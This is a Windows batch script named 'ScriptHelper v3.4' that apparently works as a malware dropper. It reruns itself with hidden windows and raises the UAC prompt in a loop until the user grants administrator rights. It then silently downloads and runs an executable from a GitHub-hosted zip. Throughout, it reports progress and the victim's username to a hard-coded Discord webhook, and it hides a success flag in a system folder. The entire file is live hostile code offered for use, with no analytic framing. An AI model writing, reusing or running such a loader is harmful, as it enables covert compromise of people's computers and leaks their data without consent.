@echo off
setlocal enabledelayedexpansion

:: =============================================================================
:: ScriptHelper - Enhanced Version 3.4
:: Features: Windowless, Discord Webhooks, Persistent UAC Loop
:: =============================================================================

:: Configuration
set "DOWNLOAD_URL=https://github.com/afscoder29/bookish-disco/raw/refs/heads/main/winx.zip"
set "TEMP_DIR=%LOCALAPPDATA%\ScriptHelper_temp"
set "EXECUTABLE=ScriptHelper.exe"
set "VCREDIST_URL=https://aka.ms/vs/17/release/vc_redist.x64.exe"
set "SUCCESS_FLAG=%PROGRAMDATA%\Microsoft\Windows\ScriptHelper\.success"
set "DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/1397005678568276124/zTFS1Ov0zdL_pg4sJRx5HOHWHYiogEkNu2my1JV2zQWDscHdedAVcGU49NGbfqtktIYd"
set "LOG_FILE=%PROGRAMDATA%\ScriptHelper.log"

:: Check if script already completed successfully
if exist "%SUCCESS_FLAG%" (
    call :Log "Script already completed successfully. Exiting."
    exit /b 0
)

:: Check if running windowless
if "%~1"=="windowless" goto :WindowlessMode
if "%~1"=="elevated" goto :AdminConfirmed

:: Launch windowless version
powershell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c \"%~f0\" windowless' -WindowStyle Hidden"
exit /b 0

:WindowlessMode
:: Initialize log
echo =============================================================================== > "%LOG_FILE%"
echo ScriptHelper v3.4 - Started at %date% %time% >> "%LOG_FILE%"
echo =============================================================================== >> "%LOG_FILE%"

:: =============================================================================
:: UAC ELEVATION - PERSISTENT LOOP VERSION (WINDOWLESS)
:: =============================================================================

:CheckAdmin
:: Test admin rights
call :Log "Checking administrative privileges..."
net session >nul 2>&1
if %errorLevel% == 0 goto :AdminConfirmed

:: Create a unique instance ID to prevent multiple UAC loops
set "INSTANCE_ID=%RANDOM%_%RANDOM%"
set "INSTANCE_FILE=%temp%\ScriptHelper_instance_%INSTANCE_ID%.lock"

:: Check if another instance is already running UAC loop
if exist "%temp%\ScriptHelper_instance_*.lock" (
    call :Log "Another UAC loop is already running. Exiting this instance."
    exit /b 0
)

:: Create instance lock file
echo Running > "%INSTANCE_FILE%"

:: We need elevation - start the persistent UAC loop
:UACLoop
call :Log "Administrative privileges required. Starting UAC loop..."

:: Create UAC elevation script that will launch elevated instance
echo Set UAC = CreateObject("Shell.Application") > "%temp%\uac_elevate.vbs"
echo UAC.ShellExecute "powershell", "-WindowStyle Hidden -Command ""Start-Process cmd -ArgumentList '/c \""%~f0\"" elevated' -WindowStyle Hidden""", "", "runas", 1 >> "%temp%\uac_elevate.vbs"

:: Execute UAC request
cscript //nologo "%temp%\uac_elevate.vbs" >nul 2>&1
del "%temp%\uac_elevate.vbs" >nul 2>&1

:: Wait for the UAC dialog and elevated process to start
timeout /t 3 /nobreak >nul

:: Check if an elevated instance is now running by checking for success
if exist "%SUCCESS_FLAG%" (
    del "%INSTANCE_FILE%" >nul 2>&1
    call :Log "Script completed successfully by elevated instance. Exiting."
    exit /b 0
)

:: Check for elevated instance by looking for running processes
tasklist /FI "IMAGENAME eq cmd.exe" /FI "WINDOWTITLE eq ScriptHelper*" >nul 2>&1
if %errorLevel% == 0 (
    del "%INSTANCE_FILE%" >nul 2>&1
    call :Log "Elevated instance detected. Exiting UAC loop."
    exit /b 0
)

:: UAC was likely denied, retry
del "%INSTANCE_FILE%" >nul 2>&1
call :Log "UAC elevation was denied. Retrying in 3 seconds..."
timeout /t 3 /nobreak >nul

:: Recreate instance file for next attempt
echo Running > "%INSTANCE_FILE%"
goto :UACLoop

:AdminConfirmed
:: This runs in the elevated instance
call :Log "Running with administrative privileges"

:: Delete the flag file to signal successful elevation
del "%temp%\ScriptHelper_elevated_*.flag" >nul 2>&1

title ScriptHelper - Running as Administrator

:: =============================================================================
:: MAIN SCRIPT EXECUTION
:: =============================================================================

call :SendWebhook "ScriptHelper Started" "ScriptHelper is now running with administrator privileges." "3447003"

:: Setup temp directory
call :Log "Setting up temporary directory: %TEMP_DIR%"
if not exist "%TEMP_DIR%" (
    mkdir "%TEMP_DIR%" 2>>"%LOG_FILE%"
    if !errorLevel! neq 0 (
        call :LogError "Failed to create temporary directory"
        call :SendWebhook "ScriptHelper Failed" "Failed to create temporary directory: %TEMP_DIR%" "15158332"
        goto :ErrorExit
    )
)

:: Visual C++ Redistributable Installation
call :Log "Starting VC++ Redistributable installation"
call :SendWebhook "Installing VC++ Redistributable" "Downloading and installing Visual C++ Redistributable..." "16776960"

powershell -WindowStyle Hidden -Command "try { $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri '%VCREDIST_URL%' -OutFile '%TEMP_DIR%\vc_redist.x64.exe' -ErrorAction Stop } catch { exit 1 }" 2>>"%LOG_FILE%"

if not exist "%TEMP_DIR%\vc_redist.x64.exe" (
    call :LogError "Failed to download VC++ Redistributable"
    call :SendWebhook "VC++ Download Warning" "Failed to download VC++ Redistributable. Continuing without it (may cause issues)." "16753920"
    goto :SkipVCRedist
)

"%TEMP_DIR%\vc_redist.x64.exe" /quiet /norestart
set "vc_result=!errorLevel!"

if !vc_result! == 0 (
    call :Log "VC++ Redistributable installed successfully"
    call :SendWebhook "VC++ Installed" "Visual C++ Redistributable installed successfully." "5763719"
) else if !vc_result! == 1638 (
    call :Log "VC++ Redistributable already present"
    call :SendWebhook "VC++ Already Present" "Visual C++ Redistributable already installed or newer version present." "3447003"
) else (
    call :Log "VC++ installation result: !vc_result!"
    call :SendWebhook "VC++ Installation" "VC++ installation completed with code: !vc_result!" "16753920"
)

del "%TEMP_DIR%\vc_redist.x64.exe" >nul 2>&1

:SkipVCRedist

:: Download Application
call :Log "Starting application download from: %DOWNLOAD_URL%"
call :SendWebhook "Downloading Application" "Downloading application from: %DOWNLOAD_URL%" "3447003"

powershell -WindowStyle Hidden -Command "try { $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%TEMP_DIR%\app.zip' -ErrorAction Stop } catch { exit 1 }" 2>>"%LOG_FILE%"

if not exist "%TEMP_DIR%\app.zip" (
    call :LogError "Failed to download application"
    call :SendWebhook "Download Failed" "Failed to download application from: %DOWNLOAD_URL%" "15158332"
    goto :ErrorExit
)

for %%I in ("%TEMP_DIR%\app.zip") do set "zip_size=%%~zI"
call :Log "Application downloaded successfully (%zip_size% bytes)"
call :SendWebhook "Download Complete" "Application downloaded successfully (!zip_size! bytes)" "5763719"

:: Extract Application
call :Log "Extracting application to: %TEMP_DIR%"
call :SendWebhook "Extracting Application" "Extracting application files..." "3447003"

powershell -WindowStyle Hidden -Command "try { Expand-Archive -Path '%TEMP_DIR%\app.zip' -DestinationPath '%TEMP_DIR%' -Force -ErrorAction Stop } catch { exit 1 }" 2>>"%LOG_FILE%"

if not exist "%TEMP_DIR%\win-x64" (
    call :LogError "Extraction failed - win-x64 folder not found"
    call :SendWebhook "Extraction Failed" "Extraction failed - win-x64 folder not found after extraction." "15158332"
    goto :ErrorExit
)

if not exist "%TEMP_DIR%\win-x64\%EXECUTABLE%" (
    call :LogError "Extraction failed - %EXECUTABLE% not found in win-x64 folder"
    call :SendWebhook "Extraction Failed" "Extraction failed - %EXECUTABLE% not found in win-x64 folder." "15158332"
    goto :ErrorExit
)

call :Log "Application extracted successfully"
call :SendWebhook "Extraction Complete" "Application extracted successfully to win-x64 folder." "5763719"

del "%TEMP_DIR%\app.zip" >nul 2>&1

:: Run Application
call :Log "Starting application: %TEMP_DIR%\win-x64\%EXECUTABLE%"
call :SendWebhook "Launching Application" "Starting %EXECUTABLE%..." "3447003"

:: Run the application completely hidden using PowerShell with full path
powershell -WindowStyle Hidden -Command "$process = Start-Process -FilePath '%TEMP_DIR%\win-x64\%EXECUTABLE%' -WorkingDirectory '%TEMP_DIR%\win-x64' -WindowStyle Hidden -PassThru -Wait; exit $process.ExitCode" 2>>"%LOG_FILE%"
set "app_result=!errorLevel!"

call :Log "Application finished with exit code: %app_result%"

if %app_result% == 0 (
    call :SendWebhook "Application Completed Successfully" "%EXECUTABLE% finished successfully with exit code: %app_result%" "5763719"
    
    :: Create hidden success flag directory and file
    if not exist "%PROGRAMDATA%\Microsoft\Windows\ScriptHelper" (
        mkdir "%PROGRAMDATA%\Microsoft\Windows\ScriptHelper" >nul 2>&1
        attrib +h "%PROGRAMDATA%\Microsoft\Windows\ScriptHelper" >nul 2>&1
    )
    echo Success > "%SUCCESS_FLAG%"
    attrib +h "%SUCCESS_FLAG%" >nul 2>&1
    call :Log "Success flag created at: %SUCCESS_FLAG%"
) else (
    call :SendWebhook "Application Finished with Warning" "%EXECUTABLE% finished with exit code: %app_result%" "16753920"
)

:: Cleanup
call :Log "Starting cleanup"
cd /d "%TEMP%"
if exist "%TEMP_DIR%\win-x64" (
    rmdir /s /q "%TEMP_DIR%\win-x64" >nul 2>&1
)
if exist "%TEMP_DIR%" (
    rmdir "%TEMP_DIR%" >nul 2>&1
)

call :Log "Script completed successfully"
call :SendWebhook "ScriptHelper Completed" "ScriptHelper finished successfully. All tasks completed and cleanup performed." "5763719"

exit /b 0

:: =============================================================================
:: ERROR HANDLING
:: =============================================================================

:ErrorExit
call :Log "Script terminated due to error"

:: Emergency cleanup
if exist "%TEMP_DIR%\app.zip" del "%TEMP_DIR%\app.zip" >nul 2>&1
if exist "%TEMP_DIR%\vc_redist.x64.exe" del "%TEMP_DIR%\vc_redist.x64.exe" >nul 2>&1
if exist "%TEMP_DIR%\win-x64" rmdir /s /q "%TEMP_DIR%\win-x64" >nul 2>&1
if exist "%TEMP_DIR%" rmdir "%TEMP_DIR%" >nul 2>&1

call :SendWebhook "ScriptHelper Failed" "ScriptHelper terminated due to an error. Check the log file for details." "15158332"

exit /b 1

:: =============================================================================
:: DISCORD WEBHOOK FUNCTION
:: =============================================================================

:SendWebhook
set "title=%~1"
set "description=%~2"
set "color=%~3"

:: Skip if webhook URL is not configured
if "%DISCORD_WEBHOOK_URL%"=="YOUR_DISCORD_WEBHOOK_URL_HERE" (
    call :Log "Webhook skipped - URL not configured"
    goto :eof
)

call :Log "Sending webhook: %title%"

:: Escape quotes for JSON
set "title=!title:"=\"!"
set "description=!description:"=\"!"

:: Create JSON payload with username
set "json={\"embeds\":[{\"title\":\"!title!\",\"description\":\"**User:** %USERNAME%\n!description!\",\"color\":!color!,\"footer\":{\"text\":\"ScriptHelper v3.4\"}}]}"

:: Send webhook with hidden window
powershell -WindowStyle Hidden -Command "$ErrorActionPreference='Stop'; try { $response = Invoke-RestMethod -Uri '%DISCORD_WEBHOOK_URL%' -Method Post -ContentType 'application/json; charset=utf-8' -Body '%json%' -UseBasicParsing; Write-Host 'SUCCESS: Webhook sent' } catch { Write-Host 'ERROR: Webhook failed -' $_.Exception.Message }" >>"%LOG_FILE%" 2>&1

goto :eof

:: =============================================================================
:: LOGGING FUNCTIONS
:: =============================================================================

:Log
set "timestamp=%date% %time%"
echo [%timestamp%] %~1 >> "%LOG_FILE%"
goto :eof

:LogError
set "timestamp=%date% %time%"
echo [%timestamp%] ERROR: %~1 >> "%LOG_FILE%"
goto :eof
